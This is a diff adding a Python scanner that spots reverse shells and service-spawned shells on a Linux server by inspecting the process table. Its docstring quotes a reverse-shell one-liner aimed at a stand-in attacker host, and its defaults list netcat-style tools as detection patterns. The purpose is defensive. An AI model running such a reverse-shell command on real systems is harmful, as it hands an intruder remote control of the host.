@@ -1,0 +1,198 @@
+#!/usr/bin/env python3
+"""
+Reverse-shell and unexpected-shell scanner.
+
+Closes the biggest gap in a login-only watcher: an attacker who never
+logs in over SSH. A reverse shell from an exploited web app, an SFTP-only
+session, or `ssh -N` port forwarding produces no login line, so the SSH
+watcher never wakes up. This detector watches the PROCESS TABLE instead
+of the auth log, so it sees the intrusion however it arrived.
+
+Two signals, both very low false-positive on a hardened single-purpose
+server:
+
+  #1 socket-stdio shell (the classic reverse shell)
+     An interactive shell (bash/sh/dash/...) whose stdin, stdout or
+     stderr is a network socket. Legitimate shells have a pty or a pipe
+     there, essentially never a raw socket. Catches
+     `bash -i >& /dev/tcp/attacker/PORT 0>&1` and nc/socat variants on
+     ANY port, including 443.
+
+  #2 service/app user spawned a shell
+     The app runs as a dedicated non-login user (default 'app', plus
+     www-data). That user has no reason to launch an interactive shell.
+     A shell owned by it, or parented by a service process
+     (node/nginx/php-fpm/gunicorn/...), means the app was made to spawn
+     a shell - the signature of a web exploit landing.
+
+Tuning: run in alert mode first. Node/PM2 apps legitimately shell out
+(child_process, npm scripts); allowed_parent_cmdlines lets you exempt
+known-good wrappers. Signal #1 is safe to leave on everywhere.
+"""
+
+import os
+import sys
+import time
+
+sys.path.insert(0, "/opt/watcher")
+import sentinel_lib as S  # noqa: E402
+
+ENABLED = S.getbool("revshell", "enabled", True)
+INTERVAL = S.getint("revshell", "scan_interval", 5)
+SHELLS = set(S.getlist("revshell", "shell_names",
+                       "bash,sh,dash,zsh,ksh,ash,busybox"))
+NETCATS = set(S.getlist("revshell", "netcat_names",
+                        "nc,ncat,netcat,socat"))
+APP_USERS = set(S.getlist("revshell", "app_users", "app,www-data"))
+SERVICE_PARENTS = set(S.getlist(
+    "revshell", "service_parents",
+    "node,nginx,apache2,php-fpm,python,python3,gunicorn,uwsgi,pm2"))
+# cmdlines that are allowed to spawn shells (substring match), e.g.
+# your deploy wrapper. Comma-separated.
+ALLOWED = S.getlist("revshell", "allowed_parent_cmdlines", "")
+
+_seen: set[tuple[int, str]] = set()
+
+
+def read_first_line(path: str) -> str:
+    try:
+        with open(path) as fh:
+            return fh.readline().strip()
+    except Exception:
+        return ""
+
+
+def proc_field(pid: int, key: str) -> str:
+    for line in read_status(pid):
+        if line.startswith(key + ":"):
+            return line.split(":", 1)[1].strip()
+    return ""
+
+
+def read_status(pid: int) -> list[str]:
+    try:
+        with open(f"/proc/{pid}/status") as fh:
+            return fh.readlines()
+    except Exception:
+        return []
+
+
+def comm(pid: int) -> str:
+    return read_first_line(f"/proc/{pid}/comm")
+
+
+def cmdline(pid: int) -> str:
+    try:
+        with open(f"/proc/{pid}/cmdline", "rb") as fh:
+            return fh.read().replace(b"\x00", b" ").decode(errors="replace").strip()
+    except Exception:
+        return ""
+
+
+def uid_name(pid: int) -> str:
+    uid = proc_field(pid, "Uid").split()[0] if proc_field(pid, "Uid") else ""
+    if not uid:
+        return ""
+    try:
+        import pwd
+        return pwd.getpwuid(int(uid)).pw_name
+    except Exception:
+        return uid
+
+
+def ppid(pid: int) -> int:
+    val = proc_field(pid, "PPid")
+    try:
+        return int(val)
+    except ValueError:
+        return 0
+
+
+def starttime(pid: int) -> str:
+    """Field 22 of /proc/pid/stat, to distinguish reused PIDs."""
+    try:
+        with open(f"/proc/{pid}/stat") as fh:
+            data = fh.read()
+        return data.rsplit(")", 1)[1].split()[19]
+    except Exception:
+        return "0"
+
+
+def stdio_has_socket(pid: int) -> bool:
+    for fd in ("0", "1", "2"):
+        try:
+            target = os.readlink(f"/proc/{pid}/fd/{fd}")
+        except Exception:
+            continue
+        if target.startswith("socket:"):
+            return True
+    return False
+
+
+def is_allowed(pid: int) -> bool:
+    line = cmdline(pid)
+    return any(a and a in line for a in ALLOWED)
+
+
+def scan_once() -> None:
+    for entry in os.listdir("/proc"):
+        if not entry.isdigit():
+            continue
+        pid = int(entry)
+        name = comm(pid)
+        if not name:
+            continue
+        is_shell = name in SHELLS
+        is_netcat = name in NETCATS
+        if not (is_shell or is_netcat):
+            continue
+
+        key = (pid, starttime(pid))
+        if key in _seen:
+            continue
+
+        user = uid_name(pid)
+        parent = comm(ppid(pid))
+
+        reason = None
+        tag = None
+        # --- #1 socket-stdio shell (any user) ---
+        if (is_shell or is_netcat) and stdio_has_socket(pid):
+            tag = "reverse-shell"
+            reason = (f"{name} (pid {pid}, user {user}) has a network socket "
+                      f"on its stdio - classic reverse shell.")
+        # --- #2 service/app user or service parent spawned a shell ---
+        elif is_shell and not is_allowed(pid) and (
+                user in APP_USERS or parent in SERVICE_PARENTS):
+            tag = "service-shell"
+            why = (f"user '{user}'" if user in APP_USERS
+                   else f"parent '{parent}'")
+            reason = (f"Interactive shell {name} (pid {pid}) spawned under "
+                      f"{why} - app/service was made to launch a shell.")
+
+        if reason:
+            _seen.add(key)
+            peers = S.peer_ips_for_pid(pid)
+            ip = peers[0] if peers else None
+            S.respond(tag, reason + (f"\nPeer: {ip}" if ip else ""),
+                      pid=pid, user=user, ip=ip,
+                      extra=f"cmdline={cmdline(pid)} parent={parent}")
+
+    # Bound memory: forget PIDs that no longer exist.
+    if len(_seen) > 4096:
+        live = {(int(e), starttime(int(e))) for e in os.listdir("/proc")
+                if e.isdigit()}
+        _seen.intersection_update(live)
+
+
+if __name__ == "__main__":
+    if not ENABLED:
+        sys.exit(0)
+    S.notify(f"Reverse-shell scanner started on {S.HOST} "
+             f"(interval {INTERVAL}s, mode {S.MODE}).")
+    while True:
+        try:
+            scan_once()
+        except Exception:
+            pass  # a bad scan must never kill the loop
+        time.sleep(INTERVAL)
